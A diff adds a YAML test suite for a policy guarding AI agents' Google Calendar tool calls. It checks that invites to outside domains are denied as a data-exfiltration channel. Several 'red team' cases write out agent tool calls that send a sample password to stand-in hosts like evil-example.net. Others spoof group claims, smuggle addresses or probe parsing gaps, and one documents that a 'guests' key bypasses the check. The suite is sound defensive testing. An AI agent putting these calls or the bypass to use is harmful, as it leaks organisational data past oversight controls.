@@ -1,0 +1,677 @@
+- description: Read tool (nspady list-events) — not an event write, passes through
+    untouched.
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: google-calendar-mcp-list-events
+      uri: null
+    payload:
+      name: google-calendar-mcp-list-events
+      args:
+        calendarId: primary
+        timeMin: "2026-07-01T00:00:00Z"
+  output:
+    expectedResult: allow
+- description: Official suggest_time carrying external attendeeEmails — a read
+    tool, not guarded by this policy, allow.
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: google-calendar-suggest_time
+      uri: null
+    payload:
+      name: google-calendar-suggest_time
+      args:
+        attendeeEmails: ["partner@client-example.net", "alice@example.com"]
+        durationMinutes: 30
+  output:
+    expectedResult: allow
+- description: nspady respond-to-event — suffix "to_event" is not in the write
+    family, passes through.
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: google-calendar-mcp-respond-to-event
+      uri: null
+    payload:
+      name: google-calendar-mcp-respond-to-event
+      args:
+        eventId: evt123
+        response: accepted
+  output:
+    expectedResult: allow
+- description: nspady create-event with internal attendee objects only. Policy
+    should allow.
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: google-calendar-mcp-create-event
+      uri: null
+    payload:
+      name: google-calendar-mcp-create-event
+      args:
+        summary: Sprint review
+        calendarId: primary
+        attendees:
+          - email: alice@example.com
+          - email: bob@example.org
+        sendUpdates: all
+  output:
+    expectedResult: allow
+- description: nspady create-event writing a secret into the description and
+    inviting an external address with sendUpdates all — the exfiltration channel.
+    Deny.
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: google-calendar-mcp-create-event
+      uri: null
+    payload:
+      name: google-calendar-mcp-create-event
+      args:
+        summary: creds
+        description: "db password: hunter2"
+        attendees:
+          - email: drop@evil-example.net
+        sendUpdates: all
+  output:
+    expectedResult: deny
+    expectedReason: This calendar event includes attendees outside the corporate domain allowlist. Google emails the event body to external attendees when updates are sent, so this invite could carry data out of the organization. Remove the external attendees, or ask your InfoSec team to add you to the calendar-external-schedulers group if cross-org scheduling is part of your role.
+- description: Official Google create_event (snake_case) with an external address
+    in the attendeeEmails string array. Deny.
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: google-calendar-create_event
+      uri: null
+    payload:
+      name: google-calendar-create_event
+      args:
+        summary: Roadmap sync
+        attendeeEmails: ["alice@example.com", "spy@press-example.net"]
+  output:
+    expectedResult: deny
+    expectedReason: This calendar event includes attendees outside the corporate domain allowlist. Google emails the event body to external attendees when updates are sent, so this invite could carry data out of the organization. Remove the external attendees, or ask your InfoSec team to add you to the calendar-external-schedulers group if cross-org scheduling is part of your role.
+- description: nspady update-event (kebab-case) adding an external attendee to an
+    existing event. Deny.
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: google-calendar-mcp-update-event
+      uri: null
+    payload:
+      name: google-calendar-mcp-update-event
+      args:
+        eventId: evt123
+        attendees:
+          - email: alice@example.com
+          - email: exfil@evil-example.net
+  output:
+    expectedResult: deny
+    expectedReason: This calendar event includes attendees outside the corporate domain allowlist. Google emails the event body to external attendees when updates are sent, so this invite could carry data out of the organization. Remove the external attendees, or ask your InfoSec team to add you to the calendar-external-schedulers group if cross-org scheduling is part of your role.
+- description: Official update_event with internal attendees only. Allow.
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: google-calendar-update_event
+      uri: null
+    payload:
+      name: google-calendar-update_event
+      args:
+        eventId: evt123
+        attendees:
+          - email: carol@example.com
+  output:
+    expectedResult: allow
+- description: taylorwilsdon manage_event with action create and an external
+    attendee. Deny.
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: google-workspace-mcp-manage_event
+      uri: null
+    payload:
+      name: google-workspace-mcp-manage_event
+      args:
+        action: create
+        summary: Handoff
+        attendees:
+          - email: outsider@evil-example.net
+  output:
+    expectedResult: deny
+    expectedReason: This calendar event includes attendees outside the corporate domain allowlist. Google emails the event body to external attendees when updates are sent, so this invite could carry data out of the organization. Remove the external attendees, or ask your InfoSec team to add you to the calendar-external-schedulers group if cross-org scheduling is part of your role.
+- description: taylorwilsdon manage_event with an explicit delete action — no
+    attendee payload to guard; deletes belong to freeze-destructive-events. Allow
+    here.
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: google-workspace-mcp-manage_event
+      uri: null
+    payload:
+      name: google-workspace-mcp-manage_event
+      args:
+        action: delete
+        eventId: evt123
+  output:
+    expectedResult: allow
+- description: 'Red team: manage_event with the action argument omitted entirely
+    but external attendees present — the unverified action fails closed and the
+    write is guarded. Deny.'
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: google-workspace-mcp-manage_event
+      uri: null
+    payload:
+      name: google-workspace-mcp-manage_event
+      args:
+        summary: Quiet invite
+        attendees:
+          - email: shadow@evil-example.net
+  output:
+    expectedResult: deny
+    expectedReason: This calendar event includes attendees outside the corporate domain allowlist. Google emails the event body to external attendees when updates are sent, so this invite could carry data out of the organization. Remove the external attendees, or ask your InfoSec team to add you to the calendar-external-schedulers group if cross-org scheduling is part of your role.
+- description: 'Red team: manage_event with a non-string action (number) and an
+    external attendee — the malformed action cannot prove a delete, so the call
+    stays guarded. Deny.'
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: google-workspace-mcp-manage_event
+      uri: null
+    payload:
+      name: google-workspace-mcp-manage_event
+      args:
+        action: 5
+        attendees:
+          - email: shadow@evil-example.net
+  output:
+    expectedResult: deny
+    expectedReason: This calendar event includes attendees outside the corporate domain allowlist. Google emails the event body to external attendees when updates are sent, so this invite could carry data out of the organization. Remove the external attendees, or ask your InfoSec team to add you to the calendar-external-schedulers group if cross-org scheduling is part of your role.
+- description: create-event with no attendees at all — a personal event, nothing
+    external to email. Allow.
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: google-calendar-mcp-create-event
+      uri: null
+    payload:
+      name: google-calendar-mcp-create-event
+      args:
+        summary: Focus block
+        calendarId: primary
+  output:
+    expectedResult: allow
+- description: attendees present but as a single string instead of an array —
+    unverifiable shape, fail closed, deny.
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: google-calendar-create_event
+      uri: null
+    payload:
+      name: google-calendar-create_event
+      args:
+        summary: Weird shape
+        attendees: drop@evil-example.net
+  output:
+    expectedResult: deny
+    expectedReason: The attendee list on this calendar event is in a shape the policy cannot verify, so the call was denied as a precaution. Provide attendees as an array of objects with an email field, or attendeeEmails as an array of address strings. If this is a false positive, contact your InfoSec team.
+- description: attendees entry is an object without a usable email field — the
+    entry cannot be checked, so the write is denied as unverifiable rather than
+    skipped.
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: google-calendar-mcp-create-event
+      uri: null
+    payload:
+      name: google-calendar-mcp-create-event
+      args:
+        summary: Malformed entry
+        attendees:
+          - displayName: Mystery Guest
+  output:
+    expectedResult: deny
+    expectedReason: The attendee list on this calendar event is in a shape the policy cannot verify, so the call was denied as a precaution. Provide attendees as an array of objects with an email field, or attendeeEmails as an array of address strings. If this is a false positive, contact your InfoSec team.
+- description: 'Red team: args is a string instead of an object on an event write
+    — nothing can be verified, fail closed, deny.'
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: google-calendar-create_event
+      uri: null
+    payload:
+      name: google-calendar-create_event
+      args: "summary=x&attendees=drop@evil-example.net"
+  output:
+    expectedResult: deny
+    expectedReason: The attendee list on this calendar event is in a shape the policy cannot verify, so the call was denied as a precaution. Provide attendees as an array of objects with an email field, or attendeeEmails as an array of address strings. If this is a false positive, contact your InfoSec team.
+- description: Caller in the placeholder calendar-external-schedulers group may
+    invite external attendees. Allow.
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    subject:
+      sub: google-apps|bd-lead@example.com
+      claims:
+        groups:
+          - staff
+          - calendar-external-schedulers
+    resource:
+      type: tool
+      name: google-calendar-mcp-create-event
+      uri: null
+    payload:
+      name: google-calendar-mcp-create-event
+      args:
+        summary: Partner kickoff
+        attendees:
+          - email: partner@client-example.net
+        sendUpdates: all
+  output:
+    expectedResult: allow
+- description: Caller with a groups claim that lacks the exemption group —
+    external invite is still denied.
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    subject:
+      sub: google-apps|intern@example.com
+      claims:
+        groups:
+          - staff
+    resource:
+      type: tool
+      name: google-calendar-mcp-create-event
+      uri: null
+    payload:
+      name: google-calendar-mcp-create-event
+      args:
+        summary: Coffee chat
+        attendees:
+          - email: friend@personal-example.net
+  output:
+    expectedResult: deny
+    expectedReason: This calendar event includes attendees outside the corporate domain allowlist. Google emails the event body to external attendees when updates are sent, so this invite could carry data out of the organization. Remove the external attendees, or ask your InfoSec team to add you to the calendar-external-schedulers group if cross-org scheduling is part of your role.
+- description: 'Red team (claim-spoofing surface): groups claim is a bare string
+    equal to the exemption group instead of an array — membership check fails
+    closed, external invite denied.'
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    subject:
+      sub: google-apps|attacker@example.com
+      claims:
+        groups: calendar-external-schedulers
+    resource:
+      type: tool
+      name: google-calendar-mcp-create-event
+      uri: null
+    payload:
+      name: google-calendar-mcp-create-event
+      args:
+        summary: Spoof
+        attendees:
+          - email: exfil@evil-example.net
+  output:
+    expectedResult: deny
+    expectedReason: This calendar event includes attendees outside the corporate domain allowlist. Google emails the event body to external attendees when updates are sent, so this invite could carry data out of the organization. Remove the external attendees, or ask your InfoSec team to add you to the calendar-external-schedulers group if cross-org scheduling is part of your role.
+- description: Mixed-case tool name and uppercase internal domain — matching and
+    domain comparison are case-insensitive, allow.
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: Google-Calendar-MCP-CREATE-EVENT
+      uri: null
+    payload:
+      name: Google-Calendar-MCP-CREATE-EVENT
+      args:
+        summary: Case check
+        attendees:
+          - email: Alice@EXAMPLE.COM
+  output:
+    expectedResult: allow
+- description: 'Red team: two addresses smuggled into one attendee email (double
+    "@"). Conservative parsing yields no domain, so the entry is treated as
+    external and denied — not silently accepted.'
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: google-calendar-mcp-create-event
+      uri: null
+    payload:
+      name: google-calendar-mcp-create-event
+      args:
+        summary: Smuggle
+        attendees:
+          - email: alice@example.com@evil-example.net
+  output:
+    expectedResult: deny
+    expectedReason: This calendar event includes attendees outside the corporate domain allowlist. Google emails the event body to external attendees when updates are sent, so this invite could carry data out of the organization. Remove the external attendees, or ask your InfoSec team to add you to the calendar-external-schedulers group if cross-org scheduling is part of your role.
+- description: 'Red team: attendee on a subdomain of an allowlisted domain
+    (u@sub.example.com). Domain matching is exact, so the subdomain is not on the
+    allowlist and the invite is denied.'
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: google-calendar-mcp-create-event
+      uri: null
+    payload:
+      name: google-calendar-mcp-create-event
+      args:
+        summary: Subdomain
+        attendees:
+          - email: u@sub.example.com
+  output:
+    expectedResult: deny
+    expectedReason: This calendar event includes attendees outside the corporate domain allowlist. Google emails the event body to external attendees when updates are sent, so this invite could carry data out of the organization. Remove the external attendees, or ask your InfoSec team to add you to the calendar-external-schedulers group if cross-org scheduling is part of your role.
+- description: 'Red team (fail-open fix): resource.name is absent entirely — only
+    the legacy payload.name identifies the write. The policy reads both fields, so
+    the external invite is still denied instead of passing as a non-write.'
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    payload:
+      name: google-calendar-mcp-create-event
+      args:
+        summary: No resource.name
+        attendees:
+          - email: exfil@evil-example.net
+  output:
+    expectedResult: deny
+    expectedReason: This calendar event includes attendees outside the corporate domain allowlist. Google emails the event body to external attendees when updates are sent, so this invite could carry data out of the organization. Remove the external attendees, or ask your InfoSec team to add you to the calendar-external-schedulers group if cross-org scheduling is part of your role.
+- description: attendeeEmails contains an object entry instead of a string —
+    unverifiable, fail closed, deny.
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: google-calendar-create_event
+      uri: null
+    payload:
+      name: google-calendar-create_event
+      args:
+        summary: Wrong entry type
+        attendeeEmails:
+          - email: alice@example.com
+  output:
+    expectedResult: deny
+    expectedReason: The attendee list on this calendar event is in a shape the policy cannot verify, so the call was denied as a precaution. Provide attendees as an array of objects with an email field, or attendeeEmails as an array of address strings. If this is a false positive, contact your InfoSec team.
+- description: Both failure modes at once — an external attendee plus an
+    unparseable attendeeEmails field. Both reasons fire and are joined sorted.
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: google-calendar-mcp-create-event
+      uri: null
+    payload:
+      name: google-calendar-mcp-create-event
+      args:
+        summary: Everything wrong
+        attendees:
+          - email: drop@evil-example.net
+        attendeeEmails: 42
+  output:
+    expectedResult: deny
+    expectedReason: 'The attendee list on this calendar event is in a shape the policy cannot verify, so the call was denied as a precaution. Provide attendees as an array of objects with an email field, or attendeeEmails as an array of address strings. If this is a false positive, contact your InfoSec team.; This calendar event includes attendees outside the corporate domain allowlist. Google emails the event body to external attendees when updates are sent, so this invite could carry data out of the organization. Remove the external attendees, or ask your InfoSec team to add you to the calendar-external-schedulers group if cross-org scheduling is part of your role.'
+- description: 'Red team (parse edge, fixed): address whose domain carries a
+    leading ">" (drop@>example.com). trim_right strips only the trailing bracket,
+    so the leading ">" survives, the domain is not the allowlisted example.com,
+    and the invite is denied as external — the earlier both-ends trim() wrongly
+    read this as internal.'
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: google-calendar-mcp-create-event
+      uri: null
+    payload:
+      name: google-calendar-mcp-create-event
+      args:
+        summary: Leading-bracket domain
+        attendees:
+          - email: drop@>example.com
+  output:
+    expectedResult: deny
+    expectedReason: This calendar event includes attendees outside the corporate domain allowlist. Google emails the event body to external attendees when updates are sent, so this invite could carry data out of the organization. Remove the external attendees, or ask your InfoSec team to add you to the calendar-external-schedulers group if cross-org scheduling is part of your role.
+- description: 'Red team (parse edge, fixed): address whose domain carries a
+    leading space (drop@ example.com). trim_right does not strip the left, so the
+    leading space keeps the domain off the allowlist and the invite is denied.'
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: google-calendar-mcp-create-event
+      uri: null
+    payload:
+      name: google-calendar-mcp-create-event
+      args:
+        summary: Leading-space domain
+        attendees:
+          - email: "drop@ example.com"
+  output:
+    expectedResult: deny
+    expectedReason: This calendar event includes attendees outside the corporate domain allowlist. Google emails the event body to external attendees when updates are sent, so this invite could carry data out of the organization. Remove the external attendees, or ask your InfoSec team to add you to the calendar-external-schedulers group if cross-org scheduling is part of your role.
+- description: Internal attendee given in "Name <user@domain>" form — the trailing
+    ">" is stripped by trim_right and the domain resolves to the allowlisted
+    example.com, so the write is allowed. Guards against the trim_right fix
+    over-denying legitimate name-addr strings.
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: google-calendar-mcp-create-event
+      uri: null
+    payload:
+      name: google-calendar-mcp-create-event
+      args:
+        summary: Internal name-addr
+        attendees:
+          - "Alice <alice@example.com>"
+  output:
+    expectedResult: allow
+- description: 'Red team (delete case-normalization): manage_event with a
+    capitalized/padded action " Delete " and external attendees — action lowercases
+    and trims to "delete", so it is treated as a delete and left to
+    freeze-destructive-events (a delete creates no invite). Allow here; documented
+    behavior.'
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: google-workspace-mcp-manage_event
+      uri: null
+    payload:
+      name: google-workspace-mcp-manage_event
+      args:
+        action: " Delete "
+        eventId: evt123
+        attendees:
+          - email: exfil@evil-example.net
+  output:
+    expectedResult: allow
+- description: 'Red team (claim-spoofing): groups claim is an object keyed by the
+    exemption group name rather than an array — membership check iterates values,
+    not keys, so it fails closed and the external invite is denied.'
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    subject:
+      sub: google-apps|attacker@example.com
+      claims:
+        groups:
+          calendar-external-schedulers: true
+    resource:
+      type: tool
+      name: google-calendar-mcp-create-event
+      uri: null
+    payload:
+      name: google-calendar-mcp-create-event
+      args:
+        summary: Object-key spoof
+        attendees:
+          - email: exfil@evil-example.net
+  output:
+    expectedResult: deny
+    expectedReason: This calendar event includes attendees outside the corporate domain allowlist. Google emails the event body to external attendees when updates are sent, so this invite could carry data out of the organization. Remove the external attendees, or ask your InfoSec team to add you to the calendar-external-schedulers group if cross-org scheduling is part of your role.
+- description: 'Red team (fail-open probe): event write whose attendees value is
+    explicitly null — treated as no attendees (a personal event), so it is allowed;
+    attendeeEmails is still inspected independently.'
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: google-calendar-mcp-create-event
+      uri: null
+    payload:
+      name: google-calendar-mcp-create-event
+      args:
+        summary: Null attendees
+        attendees: null
+  output:
+    expectedResult: allow
+- description: 'Red team (exemption precedence, documented): an exempt caller whose
+    attendees arg is a bare string (an unverifiable, non-array shape) is still
+    allowed — the calendar-external-schedulers exemption is evaluated before the
+    fail-closed shape check. Non-exempt callers are denied on this same shape (see
+    the single-string case above). Locks the documented precedence.'
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    subject:
+      sub: google-apps|bd-lead@example.com
+      claims:
+        groups:
+          - calendar-external-schedulers
+    resource:
+      type: tool
+      name: google-calendar-mcp-create-event
+      uri: null
+    payload:
+      name: google-calendar-mcp-create-event
+      args:
+        summary: Exempt malformed
+        attendees: drop@evil-example.net
+  output:
+    expectedResult: allow
+- description: 'Red team (alternate attendee key, documented gap): external address
+    supplied under a "guests" key rather than attendees/attendeeEmails is not
+    inspected, so the write passes. Documented under Known limitations — extend the
+    extraction rules if your server uses this key. Locks the current behavior.'
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: google-calendar-mcp-create-event
+      uri: null
+    payload:
+      name: google-calendar-mcp-create-event
+      args:
+        summary: Alt key
+        guests:
+          - email: outsider@evil-example.net
+  output:
+    expectedResult: allow
+- description: 'Red team (zero-@ parse leg): attendee address with no "@" at all
+    cannot resolve to a domain, so it is treated as external and the write is
+    denied — the zero-@ half of the "exactly one @" rule (the double-@ half is
+    covered separately).'
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: google-calendar-mcp-create-event
+      uri: null
+    payload:
+      name: google-calendar-mcp-create-event
+      args:
+        summary: No at-sign
+        attendees:
+          - email: notanemailaddress
+  output:
+    expectedResult: deny
+    expectedReason: This calendar event includes attendees outside the corporate domain allowlist. Google emails the event body to external attendees when updates are sent, so this invite could carry data out of the organization. Remove the external attendees, or ask your InfoSec team to add you to the calendar-external-schedulers group if cross-org scheduling is part of your role.
